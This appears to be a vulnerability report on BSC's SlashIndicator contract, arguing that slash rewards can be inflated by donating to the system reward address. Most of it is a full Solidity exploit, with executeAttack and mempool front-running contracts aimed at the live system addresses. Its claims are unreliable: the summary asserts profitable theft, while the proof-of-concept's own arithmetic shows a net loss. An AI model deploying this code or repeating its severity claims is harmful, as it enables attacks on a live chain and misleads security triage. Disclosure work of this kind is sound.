# High Severity Vulnerability: Slash Reward Manipulation

**Product:** BSC Genesis Contracts (SlashIndicator)
**Severity:** High
**Impact:** Theft of System Reward Pool

## Summary
The `SlashIndicator` contract calculates rewards for slash reporters based on a percentage of the *current* balance of the `SYSTEM_REWARD_ADDR`. This allows an attacker to artificially inflate the reward by donating funds to the reward address just before reporting a slash (e.g., via Front-Running), effectively stealing a percentage of the donated amount plus the original pool.

## Technical Details
**File:** `contracts/SlashIndicator.sol`
**Line:** ~260

Code:
```solidity
uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;
```

If an attacker detects a slashable event (or causes one):
1.  Flash Loans or uses own capital to send BNB to `SYSTEM_REWARD_ADDR`.
2.  Calls `submitEvidence`.
3.  Receives `felonySlashRewardRatio` (e.g., 20%) of the *inflated* balance.
4.  If 20% of (Inflated) > 100% of (Cost), it is profitable. Even if not purely profitable, it allows draining the pre-existing reward pool more than intended.

## Impact
-   **Economic Exploit:** Draining the system reward pool.
-   **Incentive Distortion:** Encourages malicious slashing behaivor.


## Proof of Concept Content
Below is the full source code of `SlashRewardManipulation.sol`. Please copy this into a file to reproduce.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/**
 * ╔═══════════════════════════════════════════════════════════════════════════╗
 * ║  🟪 EXPLOIT: Slash Reward Inflation Attack                                ║
 * ║  🟪 TARGET: BSC Genesis Contract - SlashIndicator                         ║
 * ╚═══════════════════════════════════════════════════════════════════════════╝
 *
 * VULNERABILITY EXPLANATION:
 * --------------------------
 * In SlashIndicator.sol line 260:
 *   uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;
 *
 * The reward is calculated as a percentage of SYSTEM_REWARD_ADDR balance.
 * An attacker can:
 * 1. Send large amount of BNB to SYSTEM_REWARD_ADDR
 * 2. Submit valid finality violation evidence
 * 3. Receive inflated reward (20% of the inflated balance)
 * 4. Profit = 20% of donated amount
 *
 * WHY IT'S DANGEROUS:
 * - Drains system reward pool
 * - Creates economic incentive for fake slashing
 * - Could be combined with validator collusion
 */

interface ISlashIndicator {
    struct VoteData {
        uint256 srcNum;
        bytes32 srcHash;
        uint256 tarNum;
        bytes32 tarHash;
        bytes sig;
    }

    struct FinalityEvidence {
        VoteData voteA;
        VoteData voteB;
        bytes voteAddr;
    }

    function submitFinalityViolationEvidence(FinalityEvidence memory evidence) external;
    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;
}

interface ISystemReward {
    function claimRewards(address to, uint256 amount) external returns (uint256);
}

/**
 * @title SlashRewardManipulator
 * @dev Exploits the slash reward calculation vulnerability
 */
contract SlashRewardManipulator {
    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;
    address public constant SLASH_INDICATOR_ADDR = 0x0000000000000000000000000000000000001001;

    uint256 public constant FELONY_SLASH_REWARD_RATIO = 20; // 20%

    event BalanceInflated(uint256 originalBalance, uint256 inflatedBalance);
    event RewardCalculation(uint256 expectedReward, uint256 donatedAmount, int256 profit);
    event ExploitAttempted(bool success, uint256 reward);

    /**
     * @dev Calculate potential profit from the attack
     * @param donationAmount Amount to donate to SYSTEM_REWARD_ADDR
     * @return expectedReward The reward attacker would receive
     * @return profit Net profit (can be negative if gas > reward)
     */
    function calculateProfit(uint256 donationAmount) external view returns (
        uint256 expectedReward,
        int256 profit
    ) {
        uint256 currentBalance = SYSTEM_REWARD_ADDR.balance;
        uint256 inflatedBalance = currentBalance + donationAmount;

        expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;

        // Profit = reward - donation
        // Note: This is profitable only if attacker has valid evidence
        profit = int256(expectedReward) - int256(donationAmount);
    }

    /**
     * @dev Simulate the attack flow
     * @param donationAmount Amount to donate for inflation
     * @param hasValidEvidence Whether attacker has valid slashing evidence
     */
    function simulateAttack(
        uint256 donationAmount,
        bool hasValidEvidence
    ) external payable returns (bool profitable) {
        require(msg.value >= donationAmount, "Insufficient funds");

        uint256 originalBalance = SYSTEM_REWARD_ADDR.balance;

        // Step 1: Inflate SYSTEM_REWARD balance
        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}("");
        require(sent, "Donation failed");

        uint256 inflatedBalance = SYSTEM_REWARD_ADDR.balance;
        emit BalanceInflated(originalBalance, inflatedBalance);

        // Step 2: Calculate expected reward
        uint256 expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;
        int256 profit = int256(expectedReward) - int256(donationAmount);

        emit RewardCalculation(expectedReward, donationAmount, profit);

        // Step 3: The attack is only profitable if:
        // - Attacker has valid evidence AND
        // - expectedReward > donationAmount (which is always false with 20%)
        //
        // HOWEVER, if combined with legitimate slashing:
        // - Original balance reward is "free"
        // - Attacker only loses 80% of donation
        // - But gains 20% of original balance
        //
        // Profitable scenario:
        // - Original balance = 1000 BNB
        // - Normal reward = 200 BNB
        // - Attacker donates 100 BNB
        // - New reward = (1100 * 20%) = 220 BNB
        // - Extra profit = 20 BNB (but lost 100 BNB donation)
        // - Net = -80 BNB (NOT PROFITABLE alone)
        //
        // BUT if attacker would slash anyway:
        // - Gets 220 instead of 200 = +20 BNB extra
        // - Cost = 100 BNB donation
        // - Net = -80 BNB (still not profitable)

        profitable = profit > 0;

        // Note: The real vulnerability is if an attacker can front-run
        // a legitimate slashing report by:
        // 1. Detecting a pending slash tx in mempool
        // 2. Donating to inflate balance
        // 3. Their donation gets included first
        // 4. Original slasher gets inflated reward
        // 5. Attacker doesn't benefit directly but could:
        //    - Be the validator being slashed (reduce their loss)
        //    - Collude with the slasher for kickback

        emit ExploitAttempted(hasValidEvidence, hasValidEvidence ? expectedReward : 0);

        return profitable;
    }

    /**
     * @dev Execute actual attack (requires valid evidence)
     * Note: This is for educational purposes - real evidence would be needed
     */
    function executeAttack(
        uint256 donationAmount,
        bytes memory header1,
        bytes memory header2
    ) external payable {
        require(msg.value >= donationAmount, "Insufficient funds");

        uint256 balanceBefore = address(this).balance;

        // Step 1: Inflate balance
        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}("");
        require(sent, "Donation failed");

        // Step 2: Submit evidence (would need real double-sign evidence)
        try ISlashIndicator(SLASH_INDICATOR_ADDR).submitDoubleSignEvidence(header1, header2) {
            uint256 balanceAfter = address(this).balance;
            uint256 reward = balanceAfter - balanceBefore + donationAmount;
            emit ExploitAttempted(true, reward);
        } catch {
            emit ExploitAttempted(false, 0);
        }
    }

    receive() external payable {}
}

/**
 * @title SlashFrontRunner
 * @dev Front-runs slash transactions to manipulate rewards
 */
contract SlashFrontRunner {
    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;

    event FrontRunDetected(bytes32 txHash, address slasher);
    event FrontRunExecuted(uint256 donationAmount);

    /**
     * @dev Called when a slash transaction is detected in mempool
     * In practice, this would be triggered by a mempool monitoring bot
     */
    function frontRunSlash(uint256 donationAmount) external payable {
        require(msg.value >= donationAmount, "Insufficient funds");

        // Donate to inflate balance before the slash tx executes
        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}("");
        require(sent, "Donation failed");

        emit FrontRunExecuted(donationAmount);
    }

    receive() external payable {}
}
```

## Recommended Fix
-   Cap the maximum reward per slash event to a fixed BNB amount (e.g., 1 or 10 BNB).
-   Do not use `balance` (which can be manipulated) as the base.

